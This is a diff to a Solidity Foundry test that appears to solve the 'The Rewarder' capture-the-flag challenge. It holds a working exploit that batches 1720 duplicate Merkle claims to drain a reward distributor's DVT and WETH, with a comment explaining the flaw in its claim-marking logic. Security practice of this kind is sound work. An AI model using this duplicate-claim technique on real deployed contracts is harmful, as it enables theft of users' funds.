@@ -148,7 +148,78 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
+        // Lets see how much DVT and WETH are left
+        console.log("Starting DVT", distributor.getRemaining(address(dvt)));
+        console.log("Starting WETH", distributor.getRemaining(address(weth)));
         
+        // Check the address of the player, to determine the index in the distribution files
+        // This example we are using 0x44E97aF4418b7a17AABD8090bEA0A471a366305C, which is index 188
+        console.log("Address", player);
+
+        uint256 index = 188;
+        uint256 dvtAmount = 11524763827831882;
+        uint256 wethAmount = 1171088749244340;
+
+        // Load the distribution files
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+        // Set DVT and WETH as tokens to claim
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        /**
+         * Exploit:
+         * 
+         * The logic of the TheRewardDistributor.sol can be exploited by
+         * creating the same claim multiple times in the same batch.
+         * 
+         * On first iteration, the first if statement will be true, but will not mark the amount
+         * as claimed since the token initally is 0.
+         * 
+         * On the following interations we will go into the else clause which only update amount
+         * and bitsSet.
+         * 
+         * On the last iteration, we will mark the funds as claimed.
+         * 
+         * Each iteration transfers funds to the caller until the funds are drained from the contract.
+        */
+        
+        // Create claims
+        // We have 10 DVT, the user can claim 0.011524763827831883, which requires 867 claims for DVT
+        // We have 1 WETH, the user can claim 0.00117108874924434, which requires 853 claims for WETH
+        // Totally at 1720 claims
+        Claim[] memory claims = new Claim[](1720);
+
+        for(uint256 i = 0; i < 867; i++) {
+            claims[i] = Claim({
+                batchNumber: 0, 
+                amount: dvtAmount,
+                tokenIndex: 0,
+                proof: merkle.getProof(dvtLeaves, index) 
+            });
+        }
+
+        for(uint256 i = 867; i < 1720; i++) {
+            claims[i] = Claim({
+                batchNumber: 0,
+                amount: wethAmount,
+                tokenIndex: 1,
+                proof: merkle.getProof(wethLeaves, index) 
+            });
+        }
+        
+        // Rescue the funds
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+        
+        // Transfer to the recovery
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
+        
+        // Lets see how much DVT and WETH are left
+        console.log("Remaining DVT", distributor.getRemaining(address(dvt)));
+        console.log("Remaining WETH", distributor.getRemaining(address(weth)));
     }
 
     /**
